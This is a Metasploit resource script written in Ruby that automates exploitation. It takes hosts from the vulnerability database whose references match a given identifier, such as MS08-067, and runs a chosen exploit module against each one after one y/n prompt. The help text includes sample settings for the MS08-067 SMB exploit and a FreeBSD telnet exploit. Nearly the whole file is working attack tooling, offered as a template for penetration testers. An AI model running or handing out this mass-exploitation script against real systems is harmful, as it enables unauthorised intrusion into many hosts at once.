# easy-autoexploiter.rc
# Author: m-1-k-3 (Web: http://www.s3cur1ty.de / Twitter: @s3cur1ty_de)


<ruby>
def help_me
	help = %Q|
	HELP:
		This Metasploit RC-File could be used as a template to automate the exploitation process.
		It is just a short example and it should be modified to fit your needs.
		Before the autmatically exploiting starts we need the vulnerability database with all the vulnerability 
		references for this process. Import some vulnerability scanner results or use the metasploit scanners 
		for this. 
	
	Authors:
		m-1-k-3 (m1k3[at]s3cur1ty.de)
		sinn3r ()
	
	Possible Datastore Options:
		MODULE 		- the exploit to use
		IDENTIFIER 	- the identifier for which the resources of the exploits are analyzed
		VERBOSE 	- (true/false) more details
		HELP 		- (true) for a helping hand

	Examples:
		* MS08-067 configuration
		set MODULE "windows/smb/ms08_067_netapi"
		set IDENTIFIER "MSFT-MS08-067"

		* BSD Telnet vulnerability
		set MODULE "freebsd/telnet/telnet_encrypt_keyid"
		set IDENTIFIER "BID-51182"

	|
	help = help.gsub(/^\t/, '')
	print_line(help)
end

#
# Return true if the exploit exists in the framework
#
def exploit_exists?(path)
	# The fetch function returns a Class.
	# If not found, we get a KeyError.
	m = framework.exploits.fetch(path) rescue false
	return (m != false)
end

if (ARGV.shift == "help")
	help_me
	return
end

if (framework.datastore['HELP'] == "true")
	help_me
	return
end
	
if framework.datastore['MODULE']
        exploit = framework.datastore['MODULE']
else
	help_me
	print_error("")
	print_error("Error in MODULE Option.")
	print_error("")
	return
end


if framework.datastore['IDENTIFIER']
	identifier = framework.datastore['IDENTIFIER']
else
	help_me
	print_error("")
	print_error("Error in IDENTIFIER Option.")
	print_error("")
	return
end

if (framework.datastore['VERBOSE'] == "true")
        verbose = true
elsif (framework.datastore['VERBOSE'] == "false")
	verbose = false
else
	print_error("Error in VERBOSE Option. Valid Options are true/false")
	return
end

if not exploit_exists?(exploit)
	print_error("Module not found: #{exploit}")
	return
end

# Test and see if we have a database connected
begin
	framework.db.hosts
rescue ::ActiveRecord::ConnectionNotEstablished
	print_error("Database connection isn't established")
	return
end

#
# if verbose mode is active we first show the exploits that we will use ...
#
if verbose == true
	print_status("")
	print_status("analysing the vulnerability details ...")
	print_status("")
	framework.db.workspace.vulns.each do |vuln|
		next if (vuln.refs.to_s !~ /#{identifier}/)
		print_status("TESTMODE: Running #{exploit} against host #{vuln.host.address.to_s}")
	end
end

#
# just to get sure ask the user before exploiting some stuff
#
print_status("")
print_status("are you sure to continue with exploiting the targets [y/n]")
check_tmp = gets.chomp
if check_tmp == 'y'
	check = 1
else
	print_status("exiting ...")
	return
end

#
# Run the exploit against the target systems
#
run_single("use #{exploit}")
framework.db.workspace.vulns.each do |vuln|
	next if (vuln.refs.to_s !~ /#{identifier}/)
	run_single("set RHOST #{vuln.host.address.to_s}")
	print_status("Running #{active_module.fullname} against host #{vuln.host.address.to_s}")
	run_single("exploit -z")
	sleep 1
end
run_single("back")
</ruby>

